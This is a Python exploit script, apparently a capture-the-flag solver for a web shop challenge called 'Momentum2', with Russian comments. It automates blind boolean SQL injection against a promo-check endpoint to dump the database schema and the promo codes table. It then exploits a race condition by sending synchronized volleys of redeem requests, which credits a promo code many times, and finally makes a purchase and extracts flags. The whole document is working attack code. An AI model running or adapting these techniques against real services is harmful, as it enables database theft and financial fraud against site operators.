#!/usr/bin/env python3
"""
Momentum2 — автопилот: дамп promos через blind SQLi -> гонка на живых кодах -> покупка.

Порядок:
  1. погашаем булев оракул в GET /api/v1/promo/check (проверяем, что 1=1 true, 1=2 false);
  2. вытаскиваем DDL, список колонок и всю таблицу promos (code, uses_left);
  3. если у какого-то кода uses_left > 0 — регистрируемся и бьём TOCTOU-гонкой;
  4. при балансе >= 250 000 ₽ дёргаем POST /profile/buy.

Запуск: python3 auto.py [N]  (N — потоков в залпе, по умолчанию 60)
"""

import os
import re
import sys
import json
import time
import random
import string
import threading
import urllib.parse
import urllib.request
import http.cookiejar

BASE = os.environ.get(
    "M2_BASE",
    "https://4fc999215e4d4971.xn--80aqf1ad.xn--r1aee.xn--80afol2bmm.xn--p1acf",
).rstrip("/")
TARGET = 25_000_000  # копеек
PASS = "Pa55word!x"

CJAR = http.cookiejar.CookieJar()
OPENER = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(CJAR))


def _req(path, data=None, timeout=25):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    req = urllib.request.Request(BASE + path, data=body,
                                 method="POST" if body is not None else "GET")
    if body is not None:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("Accept", "*/*, application/json")
    req.add_header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36")
    try:
        with OPENER.open(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception:
            return e.code, ""
    except Exception as e:
        return 0, f"{type(e).__name__}: {e}"


def js(s):
    return re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), s)


def text(s):
    s = js(s)
    s = re.sub(r"<script.*?</script>", " ", s, flags=re.S | re.I)
    s = re.sub(r"<[^>]+>", " ", s)
    return re.sub(r"\s+", " ", s).strip()


def balance():
    _, raw = _req("/profile")
    m = re.search(r"([\d][\d\s\u00a0]{0,14})\s*₽", text(raw))
    return int(re.sub(r"\D", "", m.group(1)) or 0) if m else 0


# ------------------------------------------------------------------ оракул

ORACLE_CALLS = {"n": 0}


def oracle(sql, retries=3):
    """True/False по ответу /api/v1/promo/check с инъекцией. None при сбое."""
    payload = "' OR (" + sql + ")--"
    url = "/api/v1/promo/check?code=" + urllib.parse.quote(payload)
    for _ in range(retries):
        ORACLE_CALLS["n"] += 1
        st, raw = _req(url)
        if st == 200:
            try:
                return bool(json.loads(raw).get("available"))
            except Exception:
                m = re.search(r'"available"\s*:\s*(true|false)', raw)
                if m:
                    return m.group(1) == "true"
        time.sleep(0.15)
    return None


def sql_len(expr, hi=4000):
    lo = 0
    while lo < hi:
        mid = (lo + hi + 1) // 2
        v = oracle(f"length({expr})>={mid}")
        if v is None:
            return None
        if v:
            lo = mid
        else:
            hi = mid - 1
    return lo


def sql_str(expr, label=""):
    n = sql_len(expr)
    if n is None:
        return None
    if n == 0:
        return ""
    out = []
    for i in range(1, n + 1):
        lo, hi = 0, 0x2FFFF
        while lo < hi:
            mid = (lo + hi + 1) // 2
            v = oracle(f"unicode(substr(({expr}),{i},1))>={mid}")
            if v is None:
                return None
            if v:
                lo = mid
            else:
                hi = mid - 1
        out.append(chr(lo))
        if i % 20 == 0:
            print(f"    [{label}] {i}/{n}: {''.join(out)[-24:]!r}")
            sys.stdout.flush()
    return "".join(out)


# ------------------------------------------------------------------ гонка



def volley(n, code):
    results = [None] * n
    lock = threading.Lock()
    start = threading.Event()
    cnt = {"n": 0}

    def worker(i):
        try:
            _req("/profile", timeout=15)  # прогрев TLS, чтобы POST ушёл без хендшейка
        except Exception:
            pass
        with lock:
            cnt["n"] += 1
            if cnt["n"] == n:
                start.set()
        start.wait(60)
        results[i] = _req("/promo/redeem", {"code": code}, timeout=30)

    ts = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(n)]
    for t in ts:
        t.start()
    for t in ts:
        t.join(120)

    hits, credited, errs = 0, 0, {}
    for r in results:
        if r is None:
            errs["no-response"] = errs.get("no-response", 0) + 1
            continue
        st, raw = r
        d = js(raw)
        m = re.search(r'"credited"\s*:\s*(\d+)', d)
        if m:
            hits += 1
            credited += int(m.group(1))
        else:
            e = re.search(r'"error"\s*:\s*"([^"]*)"', d)
            k = f"{st}:{e.group(1) if e else text(d)[:40]}"
            errs[k] = errs.get(k, 0) + 1
    return hits, credited, errs


def fresh_account():
    _req("/logout")
    user = "a" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    _req("/register", {"username": user, "password": PASS})
    _req("/login", {"username": user, "password": PASS})
    _, raw = _req("/profile")
    return user, user in js(raw)


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 and sys.argv[1].isdigit() else 60
    print(f"BASE = {BASE}\nпотоков = {n}\n")

    print("=" * 68)
    print("0) ОРАКУЛ")
    print("=" * 68)
    t, f = oracle("1=1"), oracle("1=2")
    print(f"  1=1 -> {t} | 1=2 -> {f}")
    if not (t and f is False):
        print("  !! булев оракул не работает, дальше нет смысла")
        return

    print("\n" + "=" * 68)
    print("1) ДАМП promos (blind SQLi)")
    print("=" * 68)
    ddl = sql_str("SELECT sql FROM sqlite_master WHERE name='promos'", "ddl")
    print(f"  DDL: {ddl}")
    dump = sql_str(
        "SELECT group_concat(code||'@'||uses_left,'|') FROM promos", "dump"
    )
    print(f"  ROWS: {dump}")
    print(f"  запросов к оракулу: {ORACLE_CALLS['n']}")

    codes = []
    if dump:
        for part in dump.split("|"):
            if "@" in part:
                c, u = part.rsplit("@", 1)
                try:
                    ui = int(u)
                except ValueError:
                    ui = -1
                codes.append((c, ui))
    live = [c for c, u in codes if u > 0]
    print(f"  живых кодов (uses_left>0): {live}")

    if not live:
        print("\n  все uses_left = 0 -> гонки нет. Промо-путь закрыт.")
        # всё равно проверим баланс на всякий случай
        return

    print("\n" + "=" * 68)
    print("2) НОВЫЙ АККАУНТ")
    print("=" * 68)
    user, ok = fresh_account()
    print(f"  {user} | в профиле: {'ДА' if ok else 'НЕ НАЙДЕНО'} | баланс {balance()} ₽")

    print("\n" + "=" * 68)
    print("3) ЗАЛПЫ")
    print("=" * 68)
    for code in live:
        print(f"\n--- код {code}: залп {n} потоков ---")
        t0 = time.time()
        hits, credited, errs = volley(n, code)
        print(f"  {time.time()-t0:.2f} с | начислений {hits}/{n} | +{credited/100:.0f} ₽")
        for k, v in sorted(errs.items(), key=lambda x: -x[1])[:4]:
            print(f"    {v:>4} × {k}")
        bal = balance()
        print(f"  баланс: {bal} ₽")
        if bal >= 250000:
            break

    bal = balance()
    print(f"\nИТОГОВЫЙ БАЛАНС: {bal} ₽")
    if bal >= 250000:
        st, raw = _req("/profile/buy")
        print(f"POST /profile/buy -> {st}")
        print(f"ФЛАГИ: {re.findall(r'flag[{][^}]+[}]', js(raw))}")
        m = re.search(r"(элит\w*[^.]{0,240}|код участника[^.]{0,240})", text(raw), re.I)
        print(f"текст: {m.group(1) if m else text(raw)[:240]}")
    else:
        print(f"до цели не хватило {250000 - bal} ₽")


if __name__ == "__main__":
    main()
